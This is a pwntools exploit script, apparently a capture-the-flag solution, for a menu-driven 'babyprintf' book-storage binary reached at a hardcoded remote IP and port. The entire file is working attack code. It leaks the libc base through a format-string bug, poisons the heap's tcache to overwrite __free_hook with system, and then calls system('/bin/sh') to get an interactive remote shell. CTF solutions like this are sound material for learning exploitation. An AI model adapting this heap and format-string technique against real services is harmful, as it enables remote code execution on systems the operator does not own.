from pwn import *

#s = process("./babyprintf")
s = remote("1.13.172.204",9999)
def add(size,author,buf):
    s.sendlineafter(">","1")
    s.sendlineafter("Size:","Content size is "+str(size))
    s.sendlineafter("Author:","Book author is "+author)
    s.sendlineafter("Content:","Book content is "+buf)

def free(idx):
    s.sendlineafter(">","2")
    s.sendlineafter("Idx:","Book idx is "+str(idx))

def show(idx,fmt):
    s.sendlineafter(">","3")
    s.sendlineafter("Idx:","Book idx is "+str(idx))
    s.sendlineafter("You can show book by yourself","My format "+fmt)

add(0x450,'admin','a')#0
add(0x100,'123','123')#1
free(0)
add(0x50,'','aaaaaa')#0
show(0,'AAAA%rBBBB')
s.recvuntil("AAAA")
libc = ELF("./libc-2.31.so",checksec=False)
libc.address = u64(s.recvuntil("BBBB",drop=True)+"\x00\x00")-0x1ebfe0
success(hex(libc.address))
add(0x50,'','aaaaaa')#2
add(0x50,'','aaaaaa')#3
free(3)
free(2)
free(0)

show(1,'%\x00'+cyclic(32)+p64(libc.sym['__free_hook']-0x10))

add(0x50,p64(libc.sym['system'])*2,p64(libc.sym['system'])*4)
add(0x50,p64(libc.sym['system'])*2,p64(libc.sym['system'])*4)
#gdb.attach(s)
show(1,'/bin/sh\x00')
s.interactive()
